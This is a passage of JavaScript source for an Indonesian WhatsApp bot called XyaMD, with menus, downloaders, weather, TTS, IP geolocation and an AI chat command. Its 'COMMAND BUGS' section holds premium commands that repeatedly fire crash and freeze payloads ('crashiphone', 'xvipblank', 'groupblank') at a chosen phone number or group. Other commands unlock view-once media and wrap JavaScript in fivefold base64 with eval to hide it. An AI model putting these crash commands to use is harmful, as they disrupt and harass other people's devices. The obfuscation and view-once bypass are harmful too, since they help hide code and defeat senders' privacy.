                      list_title: "ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ",
                      button_title: "ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ"
                    },
                    tap_target_configuration: {
                      title: " X ",
                      description: "bomboclard",
                      canonical_url: "https://t.me/MexxTampan",
                      domain: "shop.example.com",
                      button_index: 0
                    }
                  }),
                  buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                  }, {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                  }, {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "ᴍᴇɴᴜ sᴄʀɪᴘᴛs",
                      sections: [{
                        title: "ᴍᴇɴᴜ sᴄʀɪᴘᴛs",
                        highlight_label: "recommend",
                        rows: [{ title: "𝐁𝐯𝐠 𝐄𝐱𝐩𝐥𝐨𝐢𝐭", description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ( ʙᴜɢ ᴍᴇɴᴜ )", id: 'bugmenu' },
                               { title: "𝐓𝐨𝐥𝐬 𝐌𝐞𝐧𝐮", description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ( ᴛᴏʟs ᴍᴇɴᴜ )", id: 'tolsmenu' }]
                      }],
                      has_multiple_buttons: true
                    })
                  }, {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "#sᴀʟᴜʀᴀɴ ᴅᴇᴠᴇʟᴏᴘᴇʀ",
                      url: "https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136",
                      merchant_url: "https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136"
                    })
                  }]
                })
              })
            }
          }
        });

        const msgContent = generateWAMessageFromContent(m.chat, interactiveMsg, { userJid: sock.user.id, quoted: fakeQuote });
        await sock.relayMessage(m.chat, msgContent.message, { messageId: msgContent.key.id });

        await sleep(1000);

        const audioPath = "./sound.mp3";
        if (fs.existsSync(audioPath)) {
          const voiceNote = await convertAudioToVoiceNote(audioPath);
          if (voiceNote) {
            await sock.sendMessage(
              m.chat,
              {
                audio: voiceNote,
                mimetype: "audio/ogg; codecs=opus",
                ptt: true
              },
              { quoted: m }
            );
          } else {
            console.log("audio dikirim sebagai mp3 biasa!!");
            await sock.sendMessage(
              m.chat,
              {
                audio: fs.readFileSync(audioPath),
                mimetype: "audio/mpeg",
                fileName: "music.mp3",
                ptt: false
              },
              { quoted: m }
            );
          }
        }
        break;
      }
      
        case "tolsmenu": {
        const reacts = ['🌞', '🔥', '🦠', '💦'];
        for (const react of reacts) {
          await sock.sendMessage(m.chat, { react: { text: react, key: m.key } });
          await sleep(250);
        }
        
        const media = await prepareWAMessageMedia({
          video: { url: "./System/menu.mp4" },
          gifPlayback: true,
          jpegThumbnail: fs.readFileSync("./System/menu-thumbnail.jpg")
        }, { upload: sock.waUploadToServer });

        const menuText = `> hello welcome to use our bot script please use it wisely and responsibly and don't misuse it thank you ${m.pushName} 

\`[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ]\`

> 𖥂 BotName : XyaMD
> 𖥂 Version : 5.0.0
> 𖥂 Developer : MexxModss
> 𖥂 Status : FreeOnlyy
> 𖥂 Action : ẉ.dev/MexxModss

\`[ 𝐓𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ]\`

> 𖥂 .play
> 𖥂 .brat
> 𖥂 .cektype
> 𖥂 .enchard
> 𖥂 .tiktok
> 𖥂 .cekidch
> 𖥂 .cekcuaca
> 𖥂 .fotolive
> 𖥂 .asisten
> 𖥂 .lacakip
> 𖥂 .tts
> 𖥂 .iqc
> 𖥂 .rvo

\`[ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ]\`

> 𖥂 .addprem
> 𖥂 .delprem
> 𖥂 .self
> 𖥂 .public
> 𖥂 .tesfunct
> 𖥂 .donasi
`;
        
        const interactiveMsg = proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: menuText }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "`© ᴄᴏᴘʏʀɪɢʜᴛ ʙʏ ᴍᴇxxᴍᴏᴅss`" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: '',
                  hasMediaAttachment: true,
                  videoMessage: media.videoMessage
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                      text: "Xya - MD",
                      url: "t.me/MexxTampan",
                      copy_code: "MexxModss",
                      expiration_time: Date.now() * 1000
                    },
                    bottom_sheet: {
                      in_thread_buttons_limit: 2,
                      divider_indices: [1, 2, 3, 4, 5, 999],
                      list_title: "ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ",
                      button_title: "ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ"
                    },
                    tap_target_configuration: {
                      title: " X ",
                      description: "bomboclard",
                      canonical_url: "https://t.me/MexxTampan",
                      domain: "shop.example.com",
                      button_index: 0
                    }
                  }),
                  buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                  }, {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                  }, {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "ᴍᴇɴᴜ sᴄʀɪᴘᴛs",
                      sections: [{
                        title: "ᴍᴇɴᴜ sᴄʀɪᴘᴛs",
                        highlight_label: "recommend",
                        rows: [{ title: "𝐁𝐯𝐠 𝐄𝐱𝐩𝐥𝐨𝐢𝐭", description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ( ʙᴜɢ ᴍᴇɴᴜ )", id: 'bugmenu' },
                               { title: "𝐓𝐨𝐥𝐬 𝐌𝐞𝐧𝐮", description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ( ᴛᴏʟs ᴍᴇɴᴜ )", id: 'tolsmenu' }]
                      }],
                      has_multiple_buttons: true
                    })
                  }, {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "#sᴀʟᴜʀᴀɴ ᴅᴇᴠᴇʟᴏᴘᴇʀ",
                      url: "https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136",
                      merchant_url: "https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136"
                    })
                  }]
                })
              })
            }
          }
        });

        const msgContent = generateWAMessageFromContent(m.chat, interactiveMsg, { userJid: sock.user.id, quoted: fakeQuote });
        await sock.relayMessage(m.chat, msgContent.message, { messageId: msgContent.key.id });

        await sleep(1000);

        const audioPath = "./sound.mp3";
        if (fs.existsSync(audioPath)) {
          const voiceNote = await convertAudioToVoiceNote(audioPath);
          if (voiceNote) {
            await sock.sendMessage(
              m.chat,
              {
                audio: voiceNote,
                mimetype: "audio/ogg; codecs=opus",
                ptt: true
              },
              { quoted: m }
            );
          } else {
            console.log("audio dikirim sebagai mp3 biasa!!");
            await sock.sendMessage(
              m.chat,
              {
                audio: fs.readFileSync(audioPath),
                mimetype: "audio/mpeg",
                fileName: "music.mp3",
                ptt: false
              },
              { quoted: m }
            );
          }
        }
        break;
      }      
      
      case "addpremium":
      case "addprem": {
        if (!isOwner) return reply("*Your Not Owner*");
        if (!args[0]) return reply(`penggunaan: ${prefix + command} @tag\nnote: jangan pake nomor langsung tag saja siapa yang mau di addpremium!!`);
        const pNum = args[0].replace(/[^0-9]/g, '');
        if (!pNum) return reply("*user tidak valid!*");
        if (premiumList.includes(pNum)) return reply(`user ${pNum} sudah menjadi premium!`);
        premiumList.push(pNum);
        fs.writeFileSync("./Access/Prem.json", JSON.stringify(premiumList, null, 2));
        return reply(`*Success!*
Nomor ${pNum} berhasil ditambahkan ke database Premium.`);
      }
      
      case "delpremium":
      case "delprem": {
        if (!isOwner) return reply("*Your Not Owner*");
        if (!args[0]) return reply(`penggunaan ${prefix + command} example ${prefix + command} @tag\nnote: jangan pake nomor langsung tag saja siapa yang mau di delpremium!!`);
        let pNumDel = q.split('|')[0].replace(/[^0-9]/g, '');
        let idxP = premiumList.indexOf(pNumDel);
        premiumList.splice(idxP, 1);
        fs.writeFileSync("./Access/Prem.json", JSON.stringify(premiumList));
        reply(`Number ${pNumDel} succes delate to database!`);
        break;
      }
      
      case "public": {
        if (!isOwner) return reply("*You're Not My Owner*");
        sock.public = true;
        reply("*Success: Changed Mode from Self to Public*");
        break;
      }
      
      case "self":
      case "private": {
        if (!isOwner) return reply("*You're Not My Owner*");
        sock.public = false;
        reply("*Success: Changed Mode from Public to Self*");
        break;
      }
      
      case "stalkch":
      case "sch":
      case "idch":
      case "cekidch": {
        if (!q) return reply(`⚠️ masukkan minimal 1 link channel!
*contoh:* .cekidch https://whatsapp.com/channel/0029Vaxxx`);

        const processMsg = await sock.sendMessage(
          m.chat, 
          { text: "⏳ sedang memeriksa channel..." }, 
          { quoted: m }
        );

        const links = q.split(/\s+/).slice(0, 10);
        let captionArr = [];

        for (let link of links) {
          const match = link.match(/channel\/([a-zA-Z0-9_-]+)/);
          if (!match || !match[1]) {
            captionArr.push(`link tidak valid: ${link}`);
            continue;
          }

          const code = match[1];

          try {
            const res = await sock.newsletterMetadata("invite", code);

            captionArr.push(`📌 *${res?.name || "Tanpa Nama"}*
• *ID Channel:* \`${res?.id}\`
• *Pengikut:* ${res?.subscribers || 0}
• *Verifikasi:* ${res?.verification || "–"}
• *State:* ${res?.state || "–"}`);
          } catch (err) {
            console.error(`❌ error cek id channel (${code}):`, err?.message || err);
            captionArr.push(`gagal cek channel: https://whatsapp.com/channel/${code}`);
          }
        }

        const caption = captionArr.join(`

---

`) || "tidak ada channel valid untuk dicek!!";

        await sock.sendMessage(m.chat, {
          text: caption,
          edit: processMsg.key
        });
        break;
      }

case "iqc": {
  if (!q) return reply(`📱 *format penggunaan:*\n\n💬 contoh:\n${prefix + command} halo semuanya!`);

  try {
    await sock.sendMessage(from, { react: { text: "⏳", key: m.key } });
  } catch (e) {}

  try {
    const axios = require('axios');
    const apiUrl = `https://api.azbry.com/api/maker/iqc?text=${encodeURIComponent(q.trim())}`;

    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
      timeout: 30000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
      }
    });

    const imageBuffer = Buffer.from(response.data);

    if (!imageBuffer || imageBuffer.length === 0) {
      throw new Error("hasil gambar dari api kosong.");
    }

    await sock.sendMessage(from, { 
      image: imageBuffer, 
      caption: `📱 *iPhone Quote Generator*\n> *Powered By MexxModss Official*` 
    }, { quoted: m });

    try {
      await sock.sendMessage(from, { react: { text: "✅", key: m.key } });
    } catch (e) {}

  } catch (err) {
    console.error(chalk.red("IQC Error:"), err?.message || err);
    reply("❌ gagal membuat gambar iqc, coba lagi nanti!");
    try {
      await sock.sendMessage(from, { react: { text: "❌", key: m.key } });
    } catch (e) {}
  }
  break;
}

case "rvo":
case "antiviewonce":
case "viewonce": {
  if (!m.quoted) return reply("❌ Reply pesan view once yang ingin dibuka!");

  const qMsg = m.quoted;
  const qMime = qMsg?.msg?.mimetype || qMsg?.mimetype || "";

  const isViewOnce = qMsg?.msg?.viewOnce || 
    qMsg?.mtype === "viewOnceMessage" || 
    qMsg?.mtype === "viewOnceMessageV2" ||
    qMsg?.mtype === "viewOnceMessageV2Extension";

  if (!isViewOnce && !qMime) return reply("❌ Pesan yang direply bukan view once!");

  try {
    try {
      await sock.sendMessage(from, { react: { text: "⏳", key: m.key } });
    } catch (e) {}
    
    const buffer = await qMsg.download();
    if (!buffer) return reply("❌ Gagal mengunduh media view once.");

    if (/image/.test(qMime)) {
      await sock.sendMessage(from, {
        image: buffer,
        caption: `*🔓 Successfully*`,
        mentions: [m.sender]
      }, { quoted: m });
    } else if (/video/.test(qMime)) {
      await sock.sendMessage(from, {
        video: buffer,
        caption: `*🔓 Successfully*`,
        mentions: [m.sender]
      }, { quoted: m });
    } else if (/audio/.test(qMime)) {
      const audioMime = qMime || "audio/mpeg";
      const isPtt = /ogg|opus/.test(audioMime);
      await sock.sendMessage(from, {
        audio: buffer,
        mimetype: audioMime,
        ptt: isPtt
      }, { quoted: m });
    } else {
      return reply("❌ tipe media tidak dikenali!");
    }
    
    try {
      await sock.sendMessage(from, { react: { text: "✅", key: m.key } });
    } catch (e) {}

  } catch (e) {
    console.error("rvo error:", e?.message || e);
    reply("❌ gagal membuka view once: " + (e.message || e));
    try {
      await sock.sendMessage(from, { react: { text: "❌", key: m.key } });
    } catch (err) {}
  }
  break;
}

case "tt":
case "tiktok": {
  if (!q) return reply("Masukkan url tiktok!");
  if (!q.match(/tiktok\.com/i)) return reply("URL tidak valid!");

  await sock.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

  try {
    const axios = require("axios");
    let captionText = `🎵 *TikTok Downloader*\nSaluran : https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136`;

    let { data } = await axios.get(`https://api.snowping.cfd/api/downloader/tiktok?url=${encodeURIComponent(q)}`);
    
    let resData = data.result || data.data || data;

    if (!resData) {
      await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
      return reply("Data tidak ditemukan dari API.");
    }

    let isSlide = false;
    let slideImages = [];
    let videoUrl = null;

    if (resData.images && Array.isArray(resData.images) && resData.images.length > 0) {
      isSlide = true;
      slideImages = resData.images;
    } else {
      videoUrl = resData.play || resData.nowm || resData.video || resData.url;
    }

    if (isSlide) {
      // Kirim slide foto satu per satu sebagai pesan gambar biasa
      for (let i = 0; i < slideImages.length; i++) {
        let urlFoto = slideImages[i];
        let fixUrl = typeof urlFoto === 'object' ? (urlFoto.url || urlFoto.link) : urlFoto;

        await sock.sendMessage(m.chat, {
          image: { url: fixUrl },
          caption: i === 0 ? captionText : `Foto slide ke-${i + 1}`
        }, { quoted: m });
      }

      await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } else if (videoUrl) {
      // Unduh media ke Buffer agar file tidak corrupt / diblokir oleh CDN TikTok
      const videoResponse = await axios.get(videoUrl, {
        responseType: 'arraybuffer',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
      });

      const videoBuffer = Buffer.from(videoResponse.data);

      await sock.sendMessage(m.chat, {
        video: videoBuffer,
        mimetype: 'video/mp4',
        caption: captionText,
      }, { quoted: m });
      
      await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } else {
      await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
      return reply("Format API tidak dikenali atau media kosong.");
    }

  } catch (e) {
    console.error(e);
    reply(`Error: ${e.message}`);
    await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
  }
  break;
}

case "tts": {
  if (!q) return reply(`*Syntax Error*\nExample: ${prefix}${command} hallo semuanya`);

  try {
    const axios = require("axios");
    const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(q)}&tl=id&client=tw-ob`;

    const { data } = await axios.get(url, {
      responseType: "arraybuffer",
      headers: { "User-Agent": "Mozilla/5.0" }
    });
    
    await sock.sendMessage(from, {
      audio: Buffer.from(data),
      mimetype: "audio/mpeg",
      ptt: false
    }, { quoted: m });
  } catch (e) {
    console.error("TTS error:", (e && e.message) ? e.message : e);
    reply("❌ gagal membuat tts: " + e.message);
  }
  break;
}

case 'lacakip': {
  if (!q) return reply(`*Syntax Error*\nExample: ${prefix}${command} 8.8.8.8`);
  
  // Mengambil IP pertama saja kalau user tidak sengaja pakai spasi
  const ip = q.trim().split(" ")[0]; 
  
  if (typeof isPrivateIP === "function" && isPrivateIP(ip)) {
    return reply(`「 ᴅᴀᴛᴀ ɪᴘ ᴀᴅᴅʀᴇs 」\n\n│─⊰ ɪᴘ : ${ip}\n│─⊰ ᴛʏᴘᴇ : ᴘʀɪᴠᴀᴛᴇ ɪᴘ\n│─⊰ sᴄᴏᴘᴇ : ʟᴏᴄᴀʟ / ɪɴᴛᴇʀɴᴀʟ ɴᴇᴛᴡᴏʀᴋ\n│─⊰ sᴛᴀᴛᴜs : ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴅɪʟᴀᴄᴀᴋ sᴇᴄᴀʀᴀ ᴘᴜʙʟɪᴄ`);
  }
  
  try {
    const res = await fetch(`http://ipwho.is/${ip}`);
    const data = await res.json();
    
    if (!data.success) {
      return reply("❌ ɪᴘ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ ᴀᴛᴀᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ");
    }
    
    const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
    return reply(`「 ᴅᴀᴛᴀ ɪᴘ ᴀᴅᴅʀᴇs 」\n\n│─⊰ ɪᴘ : ${data.ip}\n│─⊰ ɴᴇɢᴀʀᴀ : ${data.country} (${data.country_code})\n│─⊰ ʀᴇɢɪᴏɴ : ${data.region || "-"}\n│─⊰ ᴋᴏᴛᴀ : ${data.city || "-"}\n│─⊰ ᴢᴏɴᴀ : ${data.timezone?.id || "-"}\n│─⊰ ɪsᴘ : ${data.connection?.isp || "-"}\n│─⊰ ᴏʀɢ : ${data.connection?.org || "-"}\n│─⊰ ᴀsɴ : ${data.connection?.asn || "-"}\n│─⊰ ʟᴀᴛɪᴛᴜᴅᴇ : ${data.latitude}\n│─⊰ ʟᴏɴɢɪᴛᴜᴅᴇ : ${data.longitude}\n│─⊰ ɢᴏᴏɢʟᴇ ᴍᴀᴘs : ${mapLink}\n\n© Copyright By MexxModss`);
  } catch (err) {
    console.error("error:", err?.message || err);
    return reply("❌ ᴇʀᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ!!");
  }
  break;
}
      case "cekcuaca": {
        if (!q) {
          return reply(`📍 contoh penggunaan:
${prefix + command} jakarta`);
        }

        try {
          await reply('mencari data cuaca... ⏳');
          
          const axios = require('axios');
          const response = await axios.get(`https://api.nexray.eu.cc/information/cuaca?kota=${encodeURIComponent(q)}`);
          const data = response.data;

          if (!data.status || !data.result) {
            return reply("❌ gagal menemukan data cuaca untuk lokasi tersebut coba gunakan nama kota atau kecamatan lain!");
          }

          const { location, forecasts } = data.result;
          
          let teks = `⛅ *INFO CUACA HARI INI* ⛅

📍 *LOKASI*
`;
          if (location.desa) teks += `• Desa: ${location.desa}
`;
          if (location.kecamatan) teks += `• Kecamatan: ${location.kecamatan}
`;
          if (location.provinsi) teks += `• Provinsi: ${location.provinsi}

`;
          
          teks += `🗓️ *PRAKIRAAN CUACA:*

`;

          forecasts.forEach((f, i) => {
            teks += `🕒 *Jam:* ${f.waktu}
☁️ *Cuaca:* ${f.cuaca}
🌡️ *Suhu:* ${f.suhu}
💧 *Kelembaban:* ${f.kelembaban}
💨 *Angin:* ${f.kecepatan_angin} (Arah: ${f.arah_angin})
👁️ *Jarak Pandang:* ${f.visibilitas}
`;
            
            if (i < forecasts.length - 1) teks += `────────────────
`;
          });

          teks += `
*⏱️ Diperbarui:* ${data.timestamp}`;

          const imageUrl = forecasts[0]?.image_url;
          
          if (imageUrl) {
            await sock.sendMessage(m.chat, { 
              image: { url: imageUrl }, 
              caption: teks 
            }, { quoted: m });
          } else {
            await sock.sendMessage(m.chat, { text: teks }, { quoted: m });
          }

        } catch (error) {
          console.error(error);
          reply("❌ terjadi kesalahan saat mengambil data dari server!!");
        }
        break;
      }

      case "asisten":
      case "ai": {
        const input = q;
        if (!input) return reply(`contoh:
${prefix + command} siapa kamu?`);

        await sock.sendMessage(m.chat, {
          react: { text: "⏳", key: m.key }
        });

        try {
          const axios = require('axios');
          const systemPrompt = `kamu adalah asisten xya md yg bertugas untuk menjawab semua pertanyaan dengan sopan gaul tegas tapi lucu dan benar tanpa salah sedikit pun kamu dirancang oleh @MexxTampan untuk kepentingan pengembangan infrastruktur cyber, tugas kamu jawab pertanyaan sedetail mungkin maupun itu kode jawab sebanyak-banyaknya, jikaa adaa yang bertanya tentang xya md jawab xya md adalah script yang dikembangkan oleh MexxModss dengan CyaaModss mereka berdua sepasang bucin yang menciptakan saya!`;

          const db = (sock.db || global.db || {});
          if (!db.users) db.users = {};
          if (!db.users[m.sender]) db.users[m.sender] = {};
          if (!Array.isArray(db.users[m.sender].aiHistory)) db.users[m.sender].aiHistory = [];

          const history = db.users[m.sender].aiHistory.slice(-4);

          let contextText = "";
          history.forEach(h => {
            let cleanContent = typeof h.content === 'string' ? h.content : JSON.stringify(h.content);
            if (cleanContent.length > 150) cleanContent = cleanContent.slice(0, 150) + "...";
            contextText += `${h.role === 'user' ? 'User' : 'Assistant'}: ${cleanContent}
`;
          });

          let fullPrompt = `${systemPrompt}

${contextText}User: ${input}
Assistant:`;

          if (fullPrompt.length > 1200) {
            fullPrompt = `${systemPrompt}

User: ${input}
Assistant:`;
          }

          const apiUrl = `https://api.azbry.com/api/ai/gpt4o?q=${encodeURIComponent(fullPrompt)}`;
          const { data } = await axios.get(apiUrl, { timeout: 60000 });

          let rawHasil = data?.result || data?.response || data?.message || data;
          
          if (typeof rawHasil === 'string') {
            try {
              let parsed = JSON.parse(rawHasil);
              if (parsed && parsed.answer) rawHasil = parsed.answer;
              else if (parsed && parsed.result) rawHasil = parsed.result;
            } catch (e) {}
          } else if (typeof rawHasil === 'object' && rawHasil !== null) {
            if (rawHasil.answer) rawHasil = rawHasil.answer;
            else if (rawHasil.result) rawHasil = rawHasil.result;
          }

          let hasil = typeof rawHasil === 'string' ? rawHasil : String(rawHasil || "");
          hasil = hasil.replace(/^(Assistant|Asisten|User):\s*/gi, '').trim();

          if (!hasil) {
            throw new Error("respon dari server kosong!");
          }

          db.users[m.sender].aiHistory.push({ role: 'user', content: String(input) });
          db.users[m.sender].aiHistory.push({ role: 'assistant', content: String(hasil) });

          if (db.users[m.sender].aiHistory.length > 10) {
            db.users[m.sender].aiHistory = db.users[m.sender].aiHistory.slice(-10);
          }

          if (typeof sock.saveDb === 'function') sock.saveDb();
          else if (db === global.db) global.db = db;

          await sock.sendMessage(m.chat, { text: String(hasil) }, { quoted: m });
          await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

        } catch (e) {
          console.error("AI GPT-4o Error:", e.message);
          await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
          reply(`❌ gagal merespon: ${e.message}`);
        }
        break;
      }
      
      case "encbase64":
case "enchard": {
  const isDoc = m.mtype === 'documentMessage';
  const isQuotedDoc = m.quoted && m.quoted.mtype === 'documentMessage';
  
  if (!isDoc && !isQuotedDoc) {
    return reply(`[ ❌ ] harap kirim file *.js* dengan caption *${prefix + command}*
atau reply file *.js* yang sudah dikirim!`);
  }

  let docMsg;
  if (isDoc) {
    docMsg = m.message.documentMessage;
  } else {
    docMsg = m.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage;
  }
  
  const fileName = docMsg.fileName || "script.js";
  if (!fileName.toLowerCase().endsWith('.js')) {
    return await reply("[ ❌ ] mohon kirim/reply file dengan ekstensi *.js* saja!!");
  }

  await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

  try {
    const stream = await downloadContentFromMessage(docMsg, 'document');
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }

    if (buffer.length === 0) return await reply("❌ gagal mengambil isi file!!");

    const codeString = buffer.toString('utf8'); 
    
    // ENCODE 5X
    let base64 = codeString;
    for(let i = 0; i < 5; i++){
      base64 = Buffer.from(base64).toString('base64');
    }

    // Decode 5x pake loop biar rapi
    const obfuscated = `// Encoded Hard 5x By MexxModss 
(function(){
  let data = '${base64}';
  for(let i = 0; i < 5; i++){
    data = decodeURIComponent(escape(atob(data)));
  }
  const src = data;
  eval(src);
})();`;

    const outName = `encoded_${fileName}`;
    const outPath = `./system/database/${outName}`;
    
    if (!fs.existsSync('./system/database')) {
      fs.mkdirSync('./system/database', { recursive: true });
    }
    
    fs.writeFileSync(outPath, obfuscated, 'utf8');

    await sock.sendMessage(m.chat, { 
      document: fs.readFileSync(outPath), 
      fileName: outName, 
      mimetype: 'application/javascript',
      caption: `✅ *Successfully EncHard 5x*
📦 Size: ${(obfuscated.length / 1024).toFixed(2)} kB
⚙️ *@MexxTampan*` 
    }, { quoted: m });

    fs.unlinkSync(outPath);
    await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

  } catch (err) {
    console.error("ENCODE ERROR:", err);
    await reply("[ ❌ ] terjadi kesalahan teknis saat encode!!");
  }
  break;
}

case 'brat': {
  const isi = q ? q : (args.length > 0 ? args.join(" ") : null);
  if (!isi) return reply(`*Syntax Error*\nExample: ${prefix}${command} hai`);
  
  try {
    await sock.sendMessage(from, { react: { text: "⏳", key: m.key } });
  } catch (e) {}

  try {
    const { bratStatic } = require('./System/brat.js');
    const { safeSticker } = require('./System/sticker.js');
    const buffer = await bratStatic(isi);

    const stickerBuffer = await safeSticker(buffer, {
      pack: 'xʏᴀ - ᴍᴅ',
      author: 'tt : @mexxreall',
      type: 'FULL',
      quality: 70,
    });

    if (stickerBuffer) {
      await sock.sendMessage(from, { sticker: stickerBuffer }, { quoted: m });
      await sock.sendMessage(from, { react: { text: "✅", key: m.key } });
    } else {
      await sock.sendMessage(from, { image: buffer, caption: "*🍂 brat* (sticker gagal convert, dikirim sebagai gambar)" }, { quoted: m });
      await sock.sendMessage(from, { react: { text: "✅", key: m.key } });
    }
  } catch (err) {
    console.error('brat error:', (err && err.message) ? err.message : err);
    await reply("*🍂 error saat membuat sticker brat*\nℹ️ semua sumber brat sedang sibuk, coba lagi sebentar.");
    try {
      await sock.sendMessage(from, { react: { text: "❌", key: m.key } });
    } catch (e) {}
  }
  break;
}

      case 'play':
      case 'playmusic': {
        if (!q) {
          return reply(`contoh penggunaan:
${prefix}${command} dj tiktok viral`);
        }
        
        await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        try {
          const axios = require('axios');
          let api = `https://api.azbry.com/api/download/ytplay2?q=${encodeURIComponent(q)}`;
          
          let { data } = await axios.get(api);

          if (!data.status || !data.result) {
            throw new Error("Gagal mengambil data dari API.");
          }

          let res = data.result;

          let caption = `乂 *Y O U T U B E - P L A Y*

🎵 *ᴛɪᴛʟᴇ* : ${res.title}
📺 *ᴄʜᴀɴɴᴇʟ* : ${res.channel}
✅ *sᴀʟᴜʀᴀɴ : https://whatsapp.com/channel/0029Vb8wNGL7j6g785wX4136*`;

          await sock.sendMessage(
            m.chat,
            {
              image: { url: res.thumbnail },
              caption: caption
            },
            { quoted: m }
          );

          await sock.sendMessage(
            m.chat,
            {
              audio: { url: res.download },
              mimetype: 'audio/mpeg',
              fileName: `${res.title}.mp3`,
              ptt: false
            },
            { quoted: m }
          );

          await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

        } catch (e) {
          console.error("Error Detail:", e);
          reply(`❌ Error: ${e.message}`);
          await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        }
        break;
      }

      case "cektype": {
        const msgData = m.quoted ? { [m.quoted.mtype]: m.quoted } : { [m.mtype]: m.message };
        sock.relayMessage(m.chat, { extendedTextMessage: { text: JSON.stringify(msgData, null, 2) } }, {});
        break;
      }
      
// COMMAND BUGS     
      
      case "delaymaker": {
        if (!isPremium) return reply("*You are not a Premium User*");
        if (!q) return reply(`*Syntax Eror*
Example: ${command} 628xxx`);
        let numParsed = q.replace(/[^0-9]/g, '');
        if (numParsed.startsWith('0')) return reply(`*Syntax Eror*
Example: ${command} 628xxx`);
        let target = numParsed + "@s.whatsapp.net";
        reply(`*Success! Send Bug to ${target}*`);
        for (let i = 0; i < 35; i++) {
        
          await DelayHard(target);
          await sleep(500);
          await DelayHard(target);
          await sleep(500);
        }
        console.log(chalk.red.bold("Success!"));
        break;
      }
      case "xvipblank": {
        if (!isPremium) return reply("*You are not a Premium User*");
        if (!q) return reply(`*Syntax Eror*
Example: ${command} 628xxx`);
        let numParsed = q.replace(/[^0-9]/g, '');
        if (numParsed.startsWith('0')) return reply(`*Syntax Eror*
Example: ${command} 628xxx`);
        let target = numParsed + "@s.whatsapp.net";
        reply(`*Success! Send Bug to ${target}*`);
        for (let i = 0; i < 35; i++) {
        
          await lahora(target);
          await sleep(500);
          await UiOverload(target);
          await sleep(500);
          await DelayHard(target);
          await sleep(500);
        }
        console.log(chalk.red.bold("Success!"));
        break;
      }
      case "crashiphone": {
        if (!isPremium) return reply("*You are not a Premium User*");
        if (!q) return reply(`*Syntax Eror*
Example: ${command} 628xxx`);
        let numParsed = q.replace(/[^0-9]/g, '');
        if (numParsed.startsWith('0')) return reply(`*Syntax Eror*
Example: ${command} 628xxx`);
        let target = numParsed + "@s.whatsapp.net";
        reply(`*Success! Send Bug to ${target}*`);
        for (let i = 0; i < 35; i++) {
        
          await fiOSNew(target);
          await sleep(500);
          await iosCtt(target);
          await sleep(500);
        }
        console.log(chalk.red.bold("Success!"));
        break;
      }
      case "groupblank": {
  if (!isPremium) return reply("*You are not a Premium User*");
  if (!q) return reply(`*Syntax Error*\nExample: ${command} https://chat.whatsapp.com/xxxx`);

  const match = q.trim().match(/chat\.whatsapp\.com\/(?:join\/)?([A-Za-z0-9_-]+)/);
  if (!match) return reply("*Link group tidak valid*");
  const codeGroup = match[1];

  await reply(`*SuccessFully! Send Bug To ${q}*`);

  ;(async () => {
    try {
      let getGroup = await sock.groupGetInviteInfo(codeGroup);
